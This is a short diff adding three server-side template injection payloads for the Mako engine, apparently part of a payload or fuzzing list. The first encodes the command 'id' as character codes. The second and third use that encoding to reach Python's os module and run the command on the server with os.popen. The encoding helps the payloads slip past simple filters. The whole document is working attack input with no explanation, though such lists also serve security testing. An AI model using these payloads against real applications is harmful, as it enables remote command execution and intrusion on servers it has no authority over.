@@ -1,0 +1,3 @@
+${str().join(chr(i)for(i)in[105,100])}
+${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
+<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
